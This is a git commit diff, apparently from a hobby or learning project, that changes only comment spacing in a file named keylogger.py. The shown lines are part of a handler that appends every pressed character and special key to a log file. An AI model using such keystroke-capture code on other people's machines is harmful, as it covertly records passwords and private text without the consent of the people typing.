d7eda49ece2b11fbcaf126f5a4a9b958c8bb1449
SoBatista <sobatistacyber@gmail.com>
2025-01-17 12:18:50 +0100

    code_modifications

--- keylogger.py
+++ keylogger.py
@@ -6,9 +6,9 @@ def on_key_press(key):
     try:
         with open(log_file, 'a') as f: #The 'a' stands for append. This opens the file in append mode, so new content is added without erasing existing content.
             if hasattr(key, 'char') and key.char:
-                f.write(f"{key.char}\n") # Log regular character keys
+                f.write(f"{key.char}\n") #Log regular character keys
             else:
-                f.write(f"{key}\n") # Log special keys (Ctrl, Shift, Esc, etc.)
+                f.write(f"{key}\n") #Log special keys (Ctrl, Shift, Esc, etc.)
     
     except Exception as e:
         print(f"Error logging key press: {e}")
